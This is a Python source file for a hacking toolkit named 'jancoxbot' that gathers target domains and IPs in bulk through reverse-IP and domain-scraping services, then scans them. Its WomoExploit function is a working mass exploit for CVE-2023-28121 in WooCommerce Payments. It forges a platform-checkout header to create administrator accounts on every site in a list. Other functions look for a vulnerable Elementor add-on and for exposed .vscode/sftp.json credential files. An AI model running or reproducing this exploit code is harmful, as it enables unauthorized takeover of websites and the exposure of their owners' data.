
from concurrent.futures import ThreadPoolExecutor
import os, requests, re, json, urllib3, timeit
from getpass import getpass
from bs4 import BeautifulSoup
from urllib.parse import urlparse
from Files.Colors import Warna
from Files.rmvdp import FileDuplicateRemover
from ipaddress import IPv4Network
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

linux = "clear"
windows = "cls"
os.system([linux, windows][os.name == "nt"])

class Main:
	def __init__(self):
		self.Menu()
		
	def ReverseIpYqie(self):
		input_list = input('[#] ip list : ')
		save_name = input('[#] result name : ')
		print('\n')
		url = "http://ip.yqie.com/iptodomain.aspx?ip="
		open_list = open(input_list,'r').read().splitlines()
		for ip in open_list:
			try:
				response = requests.get(url+ip)
				domains = re.findall(r'<td width="90%" class="blue t_l" style="text-align: center">(.*?)</td>', response.text)
				domains = [domain for domain in domains if re.match(r'^[\x00-\x7F]+$', domain)]
				total_domains = len(domains)
				print(f"from IP {ip} we got {total_domains} domains")
				for domain in domains:
					savefile = open(save_name,'a').write(domain+'\n')
			except:
				print('[!] error site')
			
			
	def ClearPathWebsite(self):
		input_list = input('[+] list Site : ')
		save_list = input('[+] save result (.txt) : ')
		print('\n')
		open_site = open(input_list,'r',errors='ignore').read().splitlines()
		for site in open_site:
			parsed_url = urlparse(site)
			domain = parsed_url.netloc
			print(f'> {domain} ')
			open(save_list,'a').write(domain+'\n')
		
	def SubdoScannerRapiddns(self):
		list_inp = input('[#] list domain : ')
		save_inp = input('[#] result Name (txt) : ')
		print('\n')
		open_list = open(list_inp,'r').read().splitlines()
		for site in open_list:
			try:
				Agents = {'User-Agent':'Mozilla/5.0 (Linux; Android 9; SM-A530F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.192 Mobile Safari/537.36 OPR/74.0.3922.70977'}
				api = f'https://rapiddns.io/subdomain/{site}?full=1&down=0'
				r = requests.get(api,headers=Agents).text
				bs = BeautifulSoup(r,'html.parser')
				_tr = bs.find('tbody').find_all('tr')
				for pilla in _tr:
					results = pilla.find('td').text
					print(f' > {results}')
					open(save_inp,'a').write(results+'\n')
			except Exception as e:
				print(e)
		
	def GrabbyTopsitesearch(self):
		input_domain = input('[#] select domain (.net, .com use (.) : ')
		go_page = int(input('[#] start at page : '))
		page=(go_page-1)
		save_ip = input('[#] result : ')
		print('\n')
		while True:
			page += 1
			url = 'https://www.topsitessearch.com/domains/'+input_domain+'/'+str(page)
			Agents = {'User-Agent':'Mozilla/5.0 (Linux; Android 9; SM-A530F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.192 Mobile Safari/537.36 OPR/74.0.3922.70977'}
			r = requests.get(url,headers=Agents).text
			bs = BeautifulSoup(r,'html.parser')
			try:
				find = bs.find('tbody').find_all('tr')
			except:
				pass
			for a in find:
				c = a.find('td').text
				rmv = c.replace('1','').replace('2','').replace('3','').replace('4','').replace('5','').replace('6','').replace('7','').replace('8','').replace('9','').replace('10','').replace(':','').replace('0','')
				spc_rmv = rmv.strip()
				print(f'{page} > {spc_rmv}')
				open(save_ip,'a').write(spc_rmv+'\n')
		
	def GrabDomainbyDate(self):
		date_input = input('[#] date (2023-05-28) : ')
		print('\n')
		agent = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 OpenWave/96.4.3723.24'}
		pages = 0
		while True:
			pages += 1
			url = f"https://www.uidomains.com/browse-daily-domains-difference/{pages}/{date_input}"
			req = requests.get(url, headers=agent, timeout=3).text
			if 'nextPageDomains' in req:
				bs = BeautifulSoup(req,'html.parser')
				finds = bs.find('ul',class_='domains-tag-page')
				find_all_domain = finds.find_all('li')
				for done in find_all_domain:
					get_txt = (done.get_text())
					name_file = date_input+'.txt'
					with open(name_file,'a') as saving:
						saving.write(get_txt+'\n')
						print(f'[+] {get_txt} -> page {pages}')
			else:
				print('--[ end page ]--')
				break
		
	def CVEScanner(self):
		site_inp = input('[#] site list : ')
		save_inp = input('[#] result name : ')
		print('\n')
		open_site = open(site_inp,'r').read().splitlines()
		for site in open_site:
			try:
				agent = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 OpenWave/96.4.3723.24'}
				exploit = '/wp-content/plugins/essential-addons-for-elementor-lite/readme.txt'
				r = requests.get(site+exploit,headers=agent).text
				if '== Upgrade Notice ==' in r:
					print(f'[#] {site} -> vuln')
					savefile = open(save_inp,'a').write(site+'\n')
				else:
					print(f'[-] {site} -> not vuln')
					savefile = open('not-vuln.txt','a').write(site+'\n')
			except:
				print(f'[-] {site} -> error')
			
	def GrabDomainbyKeyword(self):
	      input_name = input("[#] list keyword : ")
	      input_save = input("[#] result : ")
	      print('\n')
	      url = 'https://iqwhois.com/search/'
	      open_list = open(input_name,'r').read().splitlines()
	      for keyword in open_list:
	      	try:
	      		req = requests.get(url+keyword).content
	      		bs = BeautifulSoup(req, 'html.parser')
	      		cari = bs.find_all("div",{'class':'iq-connected-domain-name'})
	      		for mencari in cari:
	      			cari1 = mencari.find("span", {'class':'conn-domain-name-class'})
	      			h = cari1.text
	      			open(input_save,'a').write(str('http://'+(cari1.text)+'\n'))
	      			print(f'[+] Grab Site Keyword {keyword} > {str(len(h))}x10 Domain')
	      	except:
	      		print(f'[-] error keyword {keyword}')
		
	def AddHttps(self):
	    input_http = input("[!] submit http:// : ")
	    input_list = input("[#] list : ")
	    input_save = input("[#] result : ")
	    print('\n')
	    open_list = open(input_list, 'r').read().splitlines()
	    for buka in open_list:
	       tambah = (input_http+buka)
	       savefile = open(input_save, 'a').write(tambah+"\n")
	       print("> "+buka+" = "+tambah)
	       
	def WomoExploit(self):
		input_site = input('[*] list : ')
		op_list = open(input_site,'r').read().splitlines()
		result_sv = input('[*] result : ')
		
		username = input('[-] username : ')
		email = input('[-] email : ')
		password = input('[-] password : ')
		print('\n')
		
		for site in op_list:
			try:
				response = requests.get(f'{site}/wp-content/plugins/woocommerce-payments/readme.txt',verify=False)
				version = re.search(r"Stable tag: (.*)", response.text).groups()[0]
				if int(version.replace('.','')) < 562:
				   print(f'{Warna.GREEN}[{site}] -> {version} this vulnerable')
				else:
					print(f'{Warna.RED}[{site}] -> {version} not vulnerable!')
			except:
				print(f'{Warna.RED}[{site}] -> error')
				
			headers = {
			'User-Agent':'Secragon Offensive Agent',
			'X-WCPAY-PLATFORM-CHECKOUT-USER':'1'
			}
			data = {
			'rest_route':'/wp/v2/users',
			'username':username,
			'email':email,
			'password':password,
			'roles':'administrator'
			}
			print(f'{Warna.YELLOW}~ Getting session ~')
			s = requests.Session()
			try:
				r = s.get(f'{site}', headers=headers, verify=False)
			except:
				print(f'{Warna.RED}[{site}] > Failed session')
			print(f'{Warna.YELLOW}=====add admin user=====')
			req = s.post(f'{site}',data=data, headers=headers, verify=False)
			if req.status_code == 201:
				print(f'{Warna.GREEN}[{site}] > succes Add Admin')
				open(result_sv,'a').write(site+'\n')
			else:
				print(f'{Warna.RED}[{site}] > failed Add Admin')
				
	def ReverseIP8(self):
		ip_input = input('[#] ip list : ')
		svfile = input('[#] result : ')
		print('\n')
		op_ip = open(ip_input,'r').read().splitlines()
		for ips in op_ip:
			try:
				r = requests.Session()
				agents = {'User-Agent':'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36'}
				req = r.get(f'https://ip8.com/reverseip/{ips}',headers=agents).text
				bs = BeautifulSoup(req, 'html.parser')
				finder = bs.find_all('a', class_='reverseHosting')
				totals_domain = 0  # Inisialisasi variabel totals_domain di luar loop
				for element in finder:
					domain = element.text
					totals_domain += 1
					open(svfile,'a').write(domain+'\n')
				print(f'{Warna.GREEN}[+] {ips} get [{totals_domain}] domains')
			except:
				print('[!] website error or your internet')
				
	def RemoveDuplicate(self):
		input_file = input('[#] file to be delected duplicates > ')
		remover = FileDuplicateRemover(input_file)
		remover.remove_duplicates()

	def RangeIPA(self):
		ip_list = input('[#] IP list : ')
		sv_name = input('[#] result : ')
		print('\n')
		op_list = open(ip_list,'r').read().splitlines()
		for ips in op_list:
			try:
				for ip in IPv4Network(ips+'/24',False):
					savefile = open(sv_name,'a').write(str(ip)+'\n')
			except:
				print(f'[!] error IPs')
		print(f'{Warna.GREEN}[#] succes range IP, saving with name {sv_name}')
		
	def ScanSFTP(self):
		site_inp = input('[#] site list (use http://) : ')
		save_inp = input('[#] result : ')
		print('\n')
		open_site = open(site_inp,'r').read().splitlines()
		for domain in open_site:
			try:
				r = requests.Session()
				response = r.get(domain+'/.vscode/sftp.json')
				json_response = response.text
				if 'remotePath' in json_response:
					print(f'{Warna.GREEN}[+] {domain} -> vuln SFTP')
					open(save_inp,'a').write(domain+'\n')
				else:
					print(f'{Warna.RED}[+] {domain} -> not vuln SFTP')
			except:
				print(f'{Warna.YELLOW}[+] {domain} -> invalid JSON response')
				
	def TesAja(self):
		def func1(crot):
			print('> '+crot)
		def func2(crot):
			print('> '+crot)
		func1('crot ah ah ah')
		func2('pelan pelan sayang <3')

	def Menu(self):
		menu = '''
           _                             __          __ 
          (_)___ _____  _________  _  __/ /_  ____  / /_
         / / __ `/ __ \/ ___/ __ \| |/_/ __ \/ __ \/ __/
        / / /_/ / / / / /__/ /_/ />  </ /_/ / /_/ / /_  
     __/ /\__,_/_/ /_/\___/\____/_/|_/_.___/\____/\__/ V 2.9
    /___/                                               
                           t.me/toolhackingPriv
	             [ how to use see at file readme.txt ]

disclaimer : I am not responsible for hacking that occurs using this tool, this is my work which aims to learn hacking by utilizing mass attacks

[1] mass add http 
[2] grabing domain by keyword
[3] CVE 2023-32244 scanner
[4] grabing site by date [priv8 server]
[5] grabing site by domain extentions
[6] subdomain scanner [maintenance]
[7] clear path sites
[8] reverse ip [server 1 up to 500 per ip]
[9] auto exploit & scan CVE 2023-28121 [WooCommerce Payments: Unauthorized Admin Access Exploit]
[10] reverse ip [server 2 up to 10000 per ip]
[11] remove duplicate file
[12] range ip
[13] sftp exploit
		'''
		
		print('\033[32m'+menu)
		select = input('[*] select u tools need : ')
		print('\033[1;37m')
		if select == '1':
			self.AddHttps()
		elif select == '2':
			self.GrabDomainbyKeyword()
		elif select == '3':
			self.CVEScanner()
		elif select == '4':
			self.GrabDomainbyDate()
		elif select == '5':
			self.GrabbyTopsitesearch()
		elif select == '6':
			self.SubdoScannerRapiddns()
		elif select == '7':
			self.ClearPathWebsite()
		elif select == '8':
			self.ReverseIpYqie()
		elif select == '9':
			self.WomoExploit()
		elif select == '10':
			self.ReverseIP8()
		elif select == '11':
			self.RemoveDuplicate()
		elif select == '12':
			self.RangeIPA()
		elif select == '13':
			self.ScanSFTP()
		elif select == '0':
			self.TesAja()
			
if __name__ == '__main__':
    print("[*] wellcome hacker >//< , to jancoxbot v2.89")
    with ThreadPoolExecutor(max_workers=int(15)) as t:
        t.submit(Main())
    pass
